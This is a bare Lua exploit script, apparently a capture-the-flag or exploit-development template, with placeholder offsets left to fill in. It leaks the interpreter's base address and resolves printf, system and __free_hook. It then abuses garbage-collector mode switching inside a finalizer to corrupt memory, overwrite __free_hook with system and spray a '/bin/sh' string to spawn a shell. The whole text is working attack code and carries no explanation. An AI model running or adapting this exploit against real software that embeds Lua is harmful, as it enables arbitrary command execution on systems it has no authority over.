function addrof(v)
 local strrep = tostring(v)
 local i = string.find(strrep, '0x')
 if i == nil then
  error("Cannot obtain address of given value")
 end
 return tonumber(string.sub(strrep, i+2), 16)
end

function hex(v)
 return string.format("0x%x", v)
end

base = addrof(start) - 0x3084
print("[Lua]: base = " .. hex(base))

printf_plt = base + 0x230ED8 - 0x8
print("[Lua]: printf@plt = " .. hex(printf_plt))

_, printf = load({}, printf_plt)
print("[Lua]: printf = " .. hex(printf))

system = printf - $SYSTEM_OFFSET$
print("[Lua]: system = " .. hex(system))
free_hook = system + $FREE_HOOK_OFFSET$
print("[Lua]: __free_hook = " .. hex(free_hook))

collectgarbage("incremental", 10)

foo = setmetatable({}, { __gc = function() collectgarbage("generational") end })

for j = 1, 110 do
 foo = {free_hook}
end

for i = 1, 10 do
 foo = {system}
end

for i = 1, 100 do
 foo = {0x68732f6e69622f}
end
